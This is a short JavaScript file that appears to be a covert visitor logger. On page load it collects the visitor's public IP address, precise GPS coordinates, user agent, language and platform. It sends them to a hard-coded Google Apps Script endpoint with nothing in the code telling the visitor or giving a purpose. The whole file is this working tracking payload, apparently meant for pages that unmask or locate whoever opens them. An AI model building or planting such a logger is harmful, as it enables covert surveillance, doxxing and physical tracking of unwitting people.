document.addEventListener("DOMContentLoaded", function() {
    const statusDiv = document.getElementById('status');
    const scriptURL = 'https://script.google.com/macros/s/AKfycbw62zRj57l6bs5C0mjkPLNM0sK1DcyK2AQxpURcKfZPFCQoqS6zVyxbnDmda3itjSN8_Q/exec';

    async function getIPAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('IP fetch error:', error);
            return 'Unknown';
        }
    }

    function getGeolocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve({ 
                    latitude: 'N/A', 
                    longitude: 'N/A', 
                    error: 'Geolocation not supported' 
                });
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => resolve({
                    latitude: position.coords.latitude.toFixed(6),
                    longitude: position.coords.longitude.toFixed(6),
                    accuracy: position.coords.accuracy.toFixed(2) + 'm'
                }),
                (error) => resolve({
                    latitude: 'N/A',
                    longitude: 'N/A',
                    error: error.message
                })
            );
        });
    }

    function getBrowserInfo() {
        const ua = navigator.userAgent;
        const browserInfo = {
            browser: navigator.appName,
            userAgent: ua,
            language: navigator.language,
            platform: navigator.platform
        };
        return browserInfo;
    }

    async function sendData(ip, location, browserInfo) {
        const data = {
            'IP Address': ip,
            'Browser': browserInfo.browser,
            'User Agent': browserInfo.userAgent,
            'Language': browserInfo.language,
            'Platform': browserInfo.platform,
            'Latitude': location.latitude,
            'Longitude': location.longitude,
            'Geolocation Accuracy': location.accuracy || 'N/A',
            'Geolocation Error': location.error || '',
            'Date': new Date().toISOString()
        };

        try {
            const response = await fetch(scriptURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams(data)
            });


        } catch (error) {
            console.error('Lỗi:', error);
        }
    }

    async function main() {
        try {
            const ip = await getIPAddress();
            const location = await getGeolocation();
            const browserInfo = getBrowserInfo();
            await sendData(ip, location, browserInfo);
        } catch (error) {
            console.error('Lỗi chính:', error);
        }
    }

    main();
});